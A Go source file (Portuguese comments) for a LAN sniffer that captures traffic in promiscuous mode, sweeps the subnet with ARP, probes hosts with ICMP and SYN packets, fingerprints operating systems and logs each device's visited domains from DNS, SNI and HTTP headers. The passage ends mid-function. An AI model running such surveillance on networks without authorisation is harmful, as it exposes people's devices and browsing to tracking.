package service

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	manuf "github.com/timest/gomanuf"
)

type SnifferService struct{}

func NewSnifferService() *SnifferService {
	return &SnifferService{}
}

// Estrutura para armazenar dados e gerar um relatório ao final
type SnifferLogs struct {
	TotalPackets     int
	TotalBytes       int
	DiscoveredHosts  map[string]string         // Mapeamento de IP para Endereço MAC
	DNSQueries       map[string]map[string]int // Domínio -> IP Solicitante -> Contagem
	TCPFlagsCounter  map[string]int            // Contagem de Flags TCP ("SYN", "FIN", etc.)
	SuspiciousIPs    map[string]int            // Contagem de pacotes suspeitos por IP (Ex: potenciais SYN Scans)
	ProtocolsCounter map[string]int            // Estatísticas de protocolos trafegados
	HostTTL          map[string]uint8          // TTL observado por IP (para OS Fingerprinting)
	HostOSByDNS      map[string]string         // OS detectado por Captive Portal DNS (IP -> "iOS/macOS", "Android", etc.)
	HostNames        map[string]string         // Nomes amigáveis dos dispositivos (via mDNS/DHCP)
	HostOSByDHCP     map[string]string         // OS detectado via Fingerprint de DHCP (Option 55)
	HostAccesses     map[string]map[string]int // IP -> Domínio -> Contagem de Acessos
}

// Domínios de Captive Portal conhecidos para detecção de SO
var captivePortalDomains = map[string]string{
	// Apple (iOS / macOS)
	"captive.apple.com":       "iOS/macOS (Apple)",
	"www.apple.com":           "iOS/macOS (Apple)",
	"gsp1.apple.com":          "iOS/macOS (Apple)",
	"www.icloud.com":          "iOS/macOS (Apple)",
	"configuration.apple.com": "iOS/macOS (Apple)",
	"gs-loc.apple.com":        "iOS/macOS (Apple)",
	"init.push.apple.com":     "iOS/macOS (Apple)",
	"courier.push.apple.com":  "iOS/macOS (Apple)",
	// Android / Google
	"connectivitycheck.gstatic.com": "Android (Google)",
	"connectivitycheck.android.com": "Android (Google)",
	"clients3.google.com":           "Android (Google)",
	"play.googleapis.com":           "Android (Google)",
	"www.google.com":                "Android (Google)",
	// Samsung (Android)
	"d.comenrz.net":            "Android (Samsung)",
	"samsungcloudsolution.com": "Android (Samsung)",
	"samsungcloudsolution.net": "Android (Samsung)",
	"config.samsungads.com":    "Android (Samsung)",
	// Microsoft Windows
	"www.msftconnecttest.com":         "Windows (Microsoft)",
	"www.msftncsi.com":                "Windows (Microsoft)",
	"dns.msftncsi.com":                "Windows (Microsoft)",
	"ipv6.msftconnecttest.com":        "Windows (Microsoft)",
	"settings-win.data.microsoft.com": "Windows (Microsoft)",
	// Linux
	"nmcheck.gnome.org":        "Linux (GNOME)",
	"network-test.debian.org":  "Linux (Debian)",
	"detectportal.firefox.com": "Linux/Firefox",
}

const devicesFile = "known_devices.json"

type KnownDevice struct {
	OS       string `json:"os"`
	LastIP   string `json:"last_ip"`
	Hostname string `json:"hostname"`
}

func loadKnownDevices() map[string]KnownDevice {
	data, err := os.ReadFile(devicesFile)
	if err != nil {
		return make(map[string]KnownDevice)
	}
	var db map[string]KnownDevice
	if err := json.Unmarshal(data, &db); err != nil {
		return make(map[string]KnownDevice)
	}
	return db
}

func saveKnownDevices(db map[string]KnownDevice) {
	data, _ := json.MarshalIndent(db, "", "  ")
	_ = os.WriteFile(devicesFile, data, 0644)
}

func NewSnifferLogs() *SnifferLogs {
	return &SnifferLogs{
		DiscoveredHosts:  make(map[string]string),
		DNSQueries:       make(map[string]map[string]int),
		TCPFlagsCounter:  make(map[string]int),
		SuspiciousIPs:    make(map[string]int),
		ProtocolsCounter: make(map[string]int),
		HostTTL:          make(map[string]uint8),
		HostOSByDNS:      make(map[string]string),
		HostNames:        make(map[string]string),
		HostOSByDHCP:     make(map[string]string),
		HostAccesses:     make(map[string]map[string]int),
	}
}

func (s *SnifferService) SniffNetwork(stopCh chan struct{}) {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Println("Erro ao buscar interfaces (Verifique se o Npcap está instalado e rodando como Adm):", err)
		return
	}

	if len(devices) == 0 {
		log.Println("Nenhuma interface encontrada.")
		return
	}

	// Busca a primeira interface válida (IPv4, não-loopback e não-APIPA)
	var deviceName string
	var deviceDesc string
	var deviceIP string
	for _, dev := range devices {
		for _, addr := range dev.Addresses {
			ip := addr.IP.String()
			if ip != "127.0.0.1" && !strings.HasPrefix(ip, "169.254.") && addr.IP.To4() != nil {
				deviceName = dev.Name
				deviceDesc = dev.Description
				deviceIP = ip
				break
			}
		}
		if deviceName != "" {
			break
		}
	}
	if deviceName == "" {
		deviceName = devices[0].Name // Fallback
		deviceDesc = devices[0].Description
	}

	fmt.Printf("\n  [*] Iniciando escuta passiva...\n")
	fmt.Printf("      Interface: %s\n", deviceDesc)
	fmt.Printf("      IP Local: %s\n", deviceIP)

	// Abre a interface. Modo promíscuo é TRUE.
	handle, err := pcap.OpenLive(deviceName, 1600, true, 100*time.Millisecond)
	if err != nil {
		log.Println("  [-] Erro ao abrir dispositivo:", err)
		return
	}
	defer handle.Close()

	// Recupera MAC e CIDR para a varredura ativa
	myMAC, cidr := s.getInterfaceDetails(deviceIP)
	if myMAC != nil && cidr != "" {
		fmt.Printf("  [*] Iniciando Varredura ARP Ativa em %s (Background)...\n", cidr)
		go s.ActiveARPSweep(deviceName, myMAC, net.ParseIP(deviceIP), cidr)
	}

	// Calcula o IP de broadcast da sub-rede dinamicamente
	var broadcastAddr string
	if cidr != "" {
		if _, ipNet, err := net.ParseCIDR(cidr); err == nil {
			broadcastAddr = s.broadcastIP(ipNet).String()
		}
	}

	fmt.Println("  [*] Escutando todo o tráfego da rede (Modo Promíscuo)...")
	fmt.Println("  [!] Pressione ENTER para encerrar a captura e gerar o RELATÓRIO DE ANÁLISE.")

	// Inicializa o nosso coletor de logs
	logs := NewSnifferLogs()

	for {
		select {
		case <-stopCh:
			fmt.Println("\n  [*] Escuta passiva finalizada. Processando dados analisados...")
			s.analyzeLogs(logs)
			return
		default:
			data, _, err := handle.ReadPacketData()
			if err != nil {
				continue // Provavelmente timeout do ReadPacketData, continua tentando
			}

			packet := gopacket.NewPacket(data, handle.LinkType(), gopacket.Default)

			// Incrementa estatísticas gerais
			logs.TotalPackets++
			logs.TotalBytes += len(data)

			var srcIP, dstIP string
			var srcMAC string
			var srcPort, dstPort string
			var protocol string = "Desconhecido"
			var extraInfo string
			var ttl uint8

			// 1. Camada Ethernet (Captura de Endereços MAC)
			if ethLayer := packet.Layer(layers.LayerTypeEthernet); ethLayer != nil {
				eth, _ := ethLayer.(*layers.Ethernet)
				srcMAC = eth.SrcMAC.String()
				protocol = "Ethernet"
			}

			// 2. Camada ARP (Excelente para Mapeamento Passivo de Rede e detectar Spoofing)
			if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
				arp, _ := arpLayer.(*layers.ARP)
				srcIP = net.IP(arp.SourceProtAddress).String()
				dstIP = net.IP(arp.DstProtAddress).String()

				// Ignora tráfego do nosso próprio IP
				if srcIP == deviceIP || dstIP == deviceIP {
					continue
				}

				protocol = "ARP"
				logs.DiscoveredHosts[srcIP] = srcMAC
				extraInfo = "Protocolo de Resolução de Endereços (ARP)"

				// --- INJECTION: Ping ativo para descobrir o TTL ---
				// Quando descobrirmos a máquina via ARP, mandamos um Ping (se ainda não temos um TTL > 4)
				if myMAC != nil {
					targetIP := net.IP(arp.SourceProtAddress)
					if currentTTL, exists := logs.HostTTL[targetIP.String()]; !exists || currentTTL <= 4 {
						targetMAC := net.HardwareAddr(arp.SourceHwAddress)
						go s.sendICMPEchoRequest(handle, myMAC, targetMAC, net.ParseIP(deviceIP), targetIP)
						go s.sendTCPSynRequest(handle, myMAC, targetMAC, net.ParseIP(deviceIP), targetIP, 135)
						go s.sendTCPSynRequest(handle, myMAC, targetMAC, net.ParseIP(deviceIP), targetIP, 445)
					}
				}
			}

			// 3. Camada de Rede (IPv4/IPv6)
			if netLayer := packet.NetworkLayer(); netLayer != nil {
				srcIP = netLayer.NetworkFlow().Src().String()
				dstIP = netLayer.NetworkFlow().Dst().String()
				protocol = netLayer.LayerType().String()

				// Filtro para ignorar IP ruidoso (Broadcast local) e a própria máquina
				if srcIP == deviceIP || dstIP == deviceIP || srcIP == broadcastAddr || dstIP == broadcastAddr || srcIP == "255.255.255.255" || dstIP == "255.255.255.255" {
					continue
				}

				// Extrai o TTL para OS Fingerprinting e armazena por IP
				if ipv4Layer := packet.Layer(layers.LayerTypeIPv4); ipv4Layer != nil {
					ipv4, _ := ipv4Layer.(*layers.IPv4)
					ttl = ipv4.TTL
					if srcIP != "" && ttl > 0 {
						// Ignora TTL de pacotes multicast (SSDP, LLMNR, mDNS) que possuem TTL fixo em 1 ou 255, poluindo a base real
						ipDestino := net.ParseIP(dstIP)
						if ipDestino != nil && !ipDestino.IsMulticast() && ttl > 5 {
							if currentTTL, exists := logs.HostTTL[srcIP]; !exists || ttl > currentTTL {
								logs.HostTTL[srcIP] = ttl
							}
						}
					}
				}

				// Associa IP ao MAC descoberto
				if srcIP != "" && srcMAC != "" {
					logs.DiscoveredHosts[srcIP] = srcMAC
				}
			}

			// 4. Camada ICMP (Ping, Traceroute, Unreachable)
			if icmpLayer := packet.Layer(layers.LayerTypeICMPv4); icmpLayer != nil {
				protocol = "ICMP"
				icmp, _ := icmpLayer.(*layers.ICMPv4)
				extraInfo = fmt.Sprintf("Tipo: %d, Código: %d", icmp.TypeCode.Type(), icmp.TypeCode.Code())
			}

			// 5. Camada de Transporte (TCP/UDP e Flags TCP)
			if transportLayer := packet.TransportLayer(); transportLayer != nil {
				protocol = transportLayer.LayerType().String()
				srcPort = transportLayer.TransportFlow().Src().String()
				dstPort = transportLayer.TransportFlow().Dst().String()

				if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
					tcp, _ := tcpLayer.(*layers.TCP)
					var flags []string
					if tcp.SYN {
						flags = append(flags, "SYN")
						logs.TCPFlagsCounter["SYN"]++
					}
					if tcp.ACK {
						flags = append(flags, "ACK")
						logs.TCPFlagsCounter["ACK"]++
					}
					if tcp.FIN {
						flags = append(flags, "FIN")
						logs.TCPFlagsCounter["FIN"]++
					}
					if tcp.RST {
						flags = append(flags, "RST")
						logs.TCPFlagsCounter["RST"]++
					}
					if tcp.PSH {
						flags = append(flags, "PSH")
						logs.TCPFlagsCounter["PSH"]++
					}
					if tcp.URG {
						flags = append(flags, "URG")
						logs.TCPFlagsCounter["URG"]++
					}

					if len(flags) > 0 {
						extraInfo += fmt.Sprintf("[Flags: %s] ", strings.Join(flags, ","))
					}

					// Heurística de Segurança: Detecta possível SYN Scan (Muitos pacotes SYN sem ACK)
					if tcp.SYN && !tcp.ACK {
						logs.SuspiciousIPs[srcIP]++
					}

					// Captura SNI em conexões HTTPS
					if dstPort == "443" && len(tcp.Payload) > 0 {
						sni := parseTLSSNI(tcp.Payload)
						if sni != "" {
							extraInfo += fmt.Sprintf("[SNI HTTPS: %s] ", sni)
							if srcIP != "" {
								if logs.HostAccesses[srcIP] == nil {
									logs.HostAccesses[srcIP] = make(map[string]int)
								}
								logs.HostAccesses[srcIP][sni]++
							}
						}
					}

					// Captura Host em conexões HTTP
					if dstPort == "80" && len(tcp.Payload) > 0 {
						host := parseHTTPHost(tcp.Payload)
						if host != "" {
							extraInfo += fmt.Sprintf("[HTTP Host: %s] ", host)
							if srcIP != "" {
								if logs.HostAccesses[srcIP] == nil {
									logs.HostAccesses[srcIP] = make(map[string]int)
								}
								logs.HostAccesses[srcIP][host]++
							}
						}
					}
				}
			}

			// Inspeção de DHCP (Estratégia 2)
			if dhcpLayer := packet.Layer(layers.LayerTypeDHCPv4); dhcpLayer != nil {
				dhcp, _ := dhcpLayer.(*layers.DHCPv4)
				for _, opt := range dhcp.Options {
					if opt.Type == layers.DHCPOptHostname {
						logs.HostNames[srcIP] = string(opt.Data)
					}
					if opt.Type == layers.DHCPOptParamsRequest {
						reqList := fmt.Sprintf("%v", opt.Data)
						if strings.Contains(reqList, "44 46 47") || strings.Contains(reqList, "46 47 31") || strings.Contains(reqList, "249 252") || strings.Contains(reqList, "3 6 15 31 33") {
							logs.HostOSByDHCP[srcIP] = "Windows"
						} else if strings.Contains(reqList, "114 119 252") {
							logs.HostOSByDHCP[srcIP] = "Apple iOS/macOS"
						} else if strings.Contains(reqList, "26 28 51") || strings.Contains(reqList, "58 59") || strings.Contains(reqList, "1 3 6 15 26") {
							logs.HostOSByDHCP[srcIP] = "Android"
						}
					}
				}
			}

			// Inspeção de Payload bruto para mDNS / NetBIOS (Estratégia 1)
			if appLayer := packet.ApplicationLayer(); appLayer != nil {
				payload := string(appLayer.Payload())
				if (dstPort == "5353" || dstPort == "137") && len(payload) > 5 {
					// Extrai dicas de SO se estiver em texto claro
					if strings.Contains(payload, "iPhone") {
						logs.HostOSByDNS[srcIP] = "iOS (Apple)"
					}
					if strings.Contains(payload, "MacBook") || strings.Contains(payload, "Macmini") || strings.Contains(payload, "iMac") {
						logs.HostOSByDNS[srcIP] = "macOS (Apple)"
					}
					if strings.Contains(payload, "iPad") {
						logs.HostOSByDNS[srcIP] = "iOS (Apple)"
					}
					if strings.Contains(payload, "Android") {
						logs.HostOSByDNS[srcIP] = "Android"
					}
					if strings.Contains(payload, "DESKTOP-") || strings.Contains(payload, "LAPTOP-") || strings.Contains(payload, "WORKGROUP") {
						logs.HostOSByDNS[srcIP] = "Windows"
					}
				}
			}

			// 6. Camada de Aplicação (Consultas DNS / Monitoramento de acessos)
			if dnsLayer := packet.Layer(layers.LayerTypeDNS); dnsLayer != nil {
				dns, _ := dnsLayer.(*layers.DNS)
				if dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 {
					dnsQuery := string(dns.Questions[0].Name)
					extraInfo += fmt.Sprintf("[Consulta DNS: %s] ", dnsQuery)

					// Verifica se o mapa interno para este domínio já existe
					if logs.DNSQueries[dnsQuery] == nil {
						logs.DNSQueries[dnsQuery] = make(map[string]int)
					}
					// Incrementa a contagem para o IP de origem específico
					logs.DNSQueries[dnsQuery][srcIP]++

					// Adiciona nos acessos do host
					if srcIP != "" {
						if logs.HostAccesses[srcIP] == nil {
							logs.HostAccesses[srcIP] = make(map[string]int)
						}
						logs.HostAccesses[srcIP][dnsQuery]++
					}

					// Técnica 3: Detecção de OS via Captive Portal DNS
					dnsLower := strings.ToLower(dnsQuery)
					if detectedOS, match := captivePortalDomains[dnsLower]; match {
						if srcIP != "" {
							logs.HostOSByDNS[srcIP] = detectedOS
						}
					}
				}
			}

			// Identificando TLS/SSL rudimentarmente (Trafego HTTPS Criptografado)
			if (dstPort == "443" || srcPort == "443") && packet.ApplicationLayer() != nil {
				appPayload := packet.ApplicationLayer().Payload()
				if len(appPayload) > 0 && appPayload[0] == 0x16 {
					extraInfo += "[Dados TLS/SSL Criptografados] "
				}
			}

			// Registra protocolo nas estatísticas
			logs.ProtocolsCounter[protocol]++

			// Formatação Visual em tempo real
			portInfoSrc, portInfoDst := "", ""
			if srcPort != "" {
				portInfoSrc = ":" + srcPort
			}
			if dstPort != "" {
				portInfoDst = ":" + dstPort
			}

			ttlInfo, macInfo := "", ""
			if ttl > 0 {
				ttlInfo = fmt.Sprintf("[TTL:%d] ", ttl)
			}
			if srcMAC != "" {
				vendor := manuf.Search(srcMAC)
				if vendor != "" {
					macInfo = fmt.Sprintf("[%s|%s] ", srcMAC, vendor)
				} else {
					macInfo = fmt.Sprintf("[%s] ", srcMAC)
				}
			}

			fmt.Printf("  [>] %s%s%s -> %s%s [%s] %s%s\n", macInfo, srcIP, portInfoSrc, dstIP, portInfoDst, protocol, ttlInfo, extraInfo)
		}
	}
}

// analyzeLogs pega a estrutura preenchida durante a captura e emite um relatório analítico
func (s *SnifferService) analyzeLogs(logs *SnifferLogs) {
	var sb strings.Builder

	sb.WriteString("\n=========================================================================\n")
	sb.WriteString("                   RELATÓRIO DE ANÁLISE DE TRÁFEGO PASSIVO               \n")
	sb.WriteString("=========================================================================\n")
	sb.WriteString(fmt.Sprintf("  Volume Analisado: %d Pacotes | Tamanho Total: %.2f KB\n", logs.TotalPackets, float64(logs.TotalBytes)/1024.0))

	sb.WriteString("\n  [+] Hosts Descobertos Fisicamente (Mapeamento IP -> MAC):\n")
	if len(logs.DiscoveredHosts) > 0 {
		for ip, mac := range logs.DiscoveredHosts {
			if ip != "" && mac != "" {
				vendor := manuf.Search(mac)
				if vendor == "" {
					vendor = "Desconhecido"
				}
				sb.WriteString(fmt.Sprintf("      - IP: %-15s | MAC: %-17s | Fabricante: %s\n", ip, mac, vendor))
			}
		}
	} else {
		sb.WriteString("      Nenhum mapeamento IP/MAC encontrado na captura.\n")
	}

	sb.WriteString("\n  [+] Distribuição de Protocolos:\n")
	if len(logs.ProtocolsCounter) > 0 {
		for proto, count := range logs.ProtocolsCounter {
			sb.WriteString(fmt.Sprintf("      - %-10s: %d pacotes\n", proto, count))
		}
	} else {
		sb.WriteString("      Nenhum protocolo reconhecido.\n")
	}

	sb.WriteString("\n  [+] Rastreador de Acessos DNS (Quem acessou o quê):\n")
	if len(logs.DNSQueries) > 0 {
		for domain, ipCounts := range logs.DNSQueries {
			sb.WriteString(fmt.Sprintf("      - Domínio: %s\n", domain))
			for ip, count := range ipCounts {
				// Tenta buscar o MAC do IP, se conhecermos
				macStr := ""
				if mac, exists := logs.DiscoveredHosts[ip]; exists && mac != "" {
					vendor := manuf.Search(mac)
					if vendor == "" {
						vendor = "Desconhecido"
					}
					macStr = fmt.Sprintf(" [MAC: %s | Fab: %s]", mac, vendor)
				}
				sb.WriteString(fmt.Sprintf("          -> Requisitado por IP: %-15s %s (%d vezes)\n", ip, macStr, count))
			}
		}
	} else {
		sb.WriteString("      Nenhuma consulta DNS interceptada.\n")
	}

	sb.WriteString("\n  [+] Estatísticas de Conexões TCP (Flags):\n")
	for flag, count := range logs.TCPFlagsCounter {
		sb.WriteString(fmt.Sprintf("      - %s: %d ocorrências\n", flag, count))
	}

	// Seção de OS Fingerprinting (Técnicas 3 e 4 combinadas)
	sb.WriteString("\n  [+] OS Fingerprinting (Identificação de Dispositivos Desconhecidos):\n")

	knownDevices := loadKnownDevices()
	dbUpdated := false

	// Coleta todos os IPs únicos que temos alguma informação de OS ou tráfego
	allIPs := make(map[string]bool)
	for ip := range logs.HostOSByDNS {
		allIPs[ip] = true
	}
	for ip := range logs.HostOSByDHCP {
		allIPs[ip] = true
	}
	for ip := range logs.HostTTL {
		allIPs[ip] = true
	}
	for ip := range logs.HostAccesses {
		allIPs[ip] = true
	}

	// Inicializa o StringBuilder para o log_https.txt
	var httpsSB strings.Builder
	httpsSB.WriteString("=========================================================================\n")
	httpsSB.WriteString("         MAPEAMENTO DE ACESSOS E DISPOSITIVOS DETECTADOS (HTTPS/DNS)      \n")
	httpsSB.WriteString("=========================================================================\n")
	httpsSB.WriteString(fmt.Sprintf("  Gerado em: %s\n\n", time.Now().Format("02/01/2006 15:04:05")))

	if len(allIPs) > 0 {
		for ip := range allIPs {
			var osDNS, osTTL string
			var ttlVal uint8

			// Técnica 2: OS via DHCP
			var osDHCP string
			if os, exists := logs.HostOSByDHCP[ip]; exists {
				osDHCP = os
			}

			// Técnica 3: OS via DNS Captive Portal / mDNS
			if os, exists := logs.HostOSByDNS[ip]; exists {
				osDNS = os
			}

			// Técnica 4: OS via TTL Fingerprinting
			if t, exists := logs.HostTTL[ip]; exists {
				ttlVal = t
				switch {
				case t >= 1 && t <= 64:
					osTTL = "Linux/Android/iOS/macOS (TTL base 64)"
				case t >= 65 && t <= 128:
					osTTL = "Windows (TTL base 128)"
				case t >= 129 && t <= 255:
					osTTL = "Roteador/Switch/Equipamento de Rede (TTL base 255)"
				}
			}

			// Decide o veredito final (Hierarquia: DHCP > DNS/mDNS > TTL)
			veredito := "Indeterminado"
			metodo := ""
			if osDHCP != "" {
				veredito = osDHCP
				metodo = "DHCP Fingerprint"
			} else if osDNS != "" {
				veredito = osDNS
				metodo = "DNS / mDNS Payload"
			} else if osTTL != "" {
				veredito = osTTL
				metodo = "TTL Fingerprint"
			}

			// Recupera o MAC
			mac := logs.DiscoveredHosts[ip]

			// Estratégia 4: Heurística de MAC (Aplicada se for Indeterminado ou TTL genérico)
			if mac != "" && (veredito == "Indeterminado" || veredito == "Linux/Android/iOS/macOS (TTL base 64)") {
				vendor := strings.ToLower(manuf.Search(mac))
				if strings.Contains(vendor, "apple") {
					veredito = "Apple iOS/macOS"
					metodo = "Fabricante MAC + Heurística"
				} else if strings.Contains(vendor, "samsung") || strings.Contains(vendor, "motorola") || strings.Contains(vendor, "xiaomi") {
					veredito = "Android"
					metodo = "Fabricante MAC + Heurística"
				} else if strings.Contains(vendor, "intel") || strings.Contains(vendor, "dell") || strings.Contains(vendor, "hp") || strings.Contains(vendor, "lenovo") {
					if ttlVal <= 64 {
						veredito = "Windows/Linux PC"
						metodo = "Fabricante MAC + Heurística"
					}
				}
			}

			// Lógica de Persistência (Banco de Dados JSON)
			if mac != "" {
				if knownDev, exists := knownDevices[mac]; exists {
					// Se já conhecíamos esse MAC, e a nova detecção é "Indeterminado" ou possivelmente falha (TTL baixo indicando Linux)
					if veredito == "Indeterminado" || (metodo == "TTL Fingerprint" && strings.Contains(veredito, "Linux")) {
						veredito = knownDev.OS
						metodo = "Persistência Local (BD)"
					}
				}

				// Salva ou atualiza no BD se for um TTL confiável, DNS ou DHCP
				if !strings.Contains(metodo, "BD") && veredito != "Indeterminado" {
					if metodo == "DNS Captive Portal" || metodo == "DNS / mDNS Payload" || metodo == "DHCP Fingerprint" || (metodo == "TTL Fingerprint" && ttlVal > 30) {
						knownDev := knownDevices[mac]
						if knownDev.OS != veredito || knownDev.LastIP != ip || knownDev.Hostname != logs.HostNames[ip] {
							knownDev.OS = veredito
							knownDev.LastIP = ip
							if name, ok := logs.HostNames[ip]; ok && name != "" {
								knownDev.Hostname = name
							}
							knownDevices[mac] = knownDev
							dbUpdated = true
						}
					}
				}
			}

			// Escreve os detalhes no log_https.txt mesmo se veredito for Indeterminado
			vereditoExibido := veredito
			if vereditoExibido == "Indeterminado" {
				vereditoExibido = "Desconhecido"
			}
			metodoExibido := metodo
			if metodoExibido == "" {
				metodoExibido = "Não determinado"
			}

			httpsSB.WriteString("-------------------------------------------------------------------------\n")
			hostnameLabel := ""
			if name, ok := logs.HostNames[ip]; ok && name != "" {
				hostnameLabel = fmt.Sprintf(" (%s)", name)
			}
			httpsSB.WriteString(fmt.Sprintf("MÁQUINA: %s%s\n", ip, hostnameLabel))
			httpsSB.WriteString("-------------------------------------------------------------------------\n")
			httpsSB.WriteString(fmt.Sprintf("  - IP:                  %s\n", ip))

			if mac != "" {
				vendor := manuf.Search(mac)
				if vendor == "" {
					vendor = "Desconhecido"
				}
				httpsSB.WriteString(fmt.Sprintf("  - MAC:                 %s (%s)\n", mac, vendor))
			} else {
				httpsSB.WriteString("  - MAC:                 Não detectado\n")
			}
			httpsSB.WriteString(fmt.Sprintf("  - Sistema Operacional: %s [Método: %s]\n", vereditoExibido, metodoExibido))
			httpsSB.WriteString("  - Destinos Acessados:\n")

			accesses := logs.HostAccesses[ip]
			if len(accesses) > 0 {
				type domainCount struct {
					domain string
					count  int
				}
				var sortedAccesses []domainCount
				for dom, count := range accesses {
					sortedAccesses = append(sortedAccesses, domainCount{dom, count})
				}
				sort.Slice(sortedAccesses, func(i, j int) bool {
					return sortedAccesses[i].count > sortedAccesses[j].count
				})
				for _, entry := range sortedAccesses {
					httpsSB.WriteString(fmt.Sprintf("      * %-50s (%d acessos)\n", entry.domain, entry.count))
				}
			} else {
				httpsSB.WriteString("      Nenhum destino capturado nesta sessão.\n")
			}
			httpsSB.WriteString("\n")

			if veredito == "Indeterminado" {
				continue
			}

			// Complementa com MAC se disponível
			macStr := ""
			if mac != "" {
				vendor := manuf.Search(mac)
				if vendor == "" {
					vendor = "MAC Randomizado"
				}
				macStr = fmt.Sprintf(" | MAC: %s (%s)", mac, vendor)
			}

			ttlStr := ""
			if ttlVal > 0 {
				ttlStr = fmt.Sprintf(" | TTL: %d", ttlVal)
			}

			// Adiciona o Hostname amigável se descoberto
			hostname := ""
			if name, exists := logs.HostNames[ip]; exists && name != "" {
				hostname = fmt.Sprintf("\n          -> Nome: %s", name)
			}

			sb.WriteString(fmt.Sprintf("      - IP: %-15s | SO: %-30s | Método: %s%s%s%s\n", ip, veredito, metodo, ttlStr, macStr, hostname))
		}

		if dbUpdated {
			saveKnownDevices(knownDevices)
		}
	} else {
		sb.WriteString("      Nenhuma impressão digital de SO capturada nesta sessão.\n")
	}

	sb.WriteString("\n  [+] Dispositivos Salvos no BD (Sinalização Offline ou Ausentes nesta captura):\n")
	foundOffline := false
	for mac, dev := range knownDevices {
		// Verifica se o MAC já foi detectado nesta sessão atual
		seenToday := false
		for _, seenMac := range logs.DiscoveredHosts {
			if seenMac == mac {
				seenToday = true
				break
			}
		}

		if !seenToday {
			foundOffline = true
			vendor := manuf.Search(mac)
			if vendor == "" {
				vendor = "MAC Randomizado"
			}
			macStr := fmt.Sprintf(" | MAC: %s (%s)", mac, vendor)

			hostname := ""
			if dev.Hostname != "" {
				hostname = fmt.Sprintf("\n          -> Nome Salvo: %s", dev.Hostname)
			}

			sb.WriteString(fmt.Sprintf("      - Último IP: %-15s | SO: %-30s | Método: Histórico do BD%s%s\n", dev.LastIP, dev.OS, macStr, hostname))
		}
	}
	if !foundOffline {
		sb.WriteString("      Todos os dispositivos conhecidos estão ativos nesta sessão ou o banco está vazio.\n")
	}

	sb.WriteString("\n  [!] Análise Heurística de Segurança:\n")
	hasAlerts := false
	for ip, synCount := range logs.SuspiciousIPs {
		// Threshold: se houver mais de 5 tentativas de SYN a partir de um IP (rudimentar, mas ilustrativo)
		if synCount > 5 {
			sb.WriteString(fmt.Sprintf("      [ALERTA] IP %s gerou %d pacotes SYN. Possível varredura de portas (SYN Flood / Scan)!\n", ip, synCount))
			hasAlerts = true
		}
	}
	if !hasAlerts {
		sb.WriteString("      Nenhum tráfego suspeito evidente (baseado em anomalias de handshake) foi detectado.\n")
	}

	sb.WriteString("=========================================================================\n\n")

	reportContent := sb.String()

	// 1. Imprime no console para o usuário ver
	fmt.Print(reportContent)

	// 2. Salva o relatório geral em log_rede.txt
	filename := "log_rede.txt"
	err := os.WriteFile(filename, []byte(reportContent), 0644)
	if err != nil {
		fmt.Printf("  [-] Erro ao salvar o relatório geral no arquivo: %v\n", err)
	} else {
		fmt.Printf("  [+] Relatório geral salvo com sucesso no arquivo: %s\n", filename)
	}

	// 3. Salva o relatório detalhado por IP e acessos em log_https.txt
	httpsFilename := "log_https.txt"
	errHTTPS := os.WriteFile(httpsFilename, []byte(httpsSB.String()), 0644)
	if errHTTPS != nil {
		fmt.Printf("  [-] Erro ao salvar o relatório de acessos no arquivo: %v\n", errHTTPS)
	} else {
		fmt.Printf("  [+] Relatório de acessos salvo com sucesso no arquivo: %s\n", httpsFilename)
	}
}

// getInterfaceDetails busca o MAC e o CIDR baseados no IP descoberto
func (s *SnifferService) getInterfaceDetails(targetIP string) (net.HardwareAddr, string) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, ""
	}
	for _, iface := range ifaces {
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok {
				if ipnet.IP.String() == targetIP {
					return iface.HardwareAddr, ipnet.String()
				}
			}
		}
	}
	return nil, ""
}

// ActiveARPSweep varre uma sub-rede enviando ARP Requests para cada IP.
func (s *SnifferService) ActiveARPSweep(deviceName string, srcMAC net.HardwareAddr, srcIP net.IP, cidr string) {
	handle, err := pcap.OpenLive(deviceName, 1600, true, pcap.BlockForever)
	if err != nil {
		return
	}
	defer handle.Close()

	ip, ipNet, err := net.ParseCIDR(cidr)
	if err != nil {
		return
	}

	ips := s.generateIPList(ipNet)

	for _, targetIP := range ips {
		if targetIP.Equal(ip) || targetIP.Equal(s.broadcastIP(ipNet)) {
			continue
		}

		_ = s.sendARPRequest(handle, srcMAC, srcIP, targetIP)
		time.Sleep(1 * time.Millisecond) // Evita DoS no switch
	}
}

// sendARPRequest constrói e injeta o pacote ARP na rede
func (s *SnifferService) sendARPRequest(handle *pcap.Handle, srcMAC net.HardwareAddr, srcIP net.IP, dstIP net.IP) error {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeARP,
	}

	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: []byte(srcIP.To4()),
		DstHwAddress:      []byte{0, 0, 0, 0, 0, 0},
		DstProtAddress:    []byte(dstIP.To4()),
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return err
	}

	return handle.WritePacketData(buf.Bytes())
}

// sendICMPEchoRequest constrói e injeta um pacote ICMP Echo Request para extrair o TTL
func (s *SnifferService) sendICMPEchoRequest(handle *pcap.Handle, srcMAC net.HardwareAddr, dstMAC net.HardwareAddr, srcIP net.IP, dstIP net.IP) error {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}

	ipv4 := layers.IPv4{
		Version:  4,
		TTL:      64,
		SrcIP:    srcIP,
		DstIP:    dstIP,
		Protocol: layers.IPProtocolICMPv4,
	}

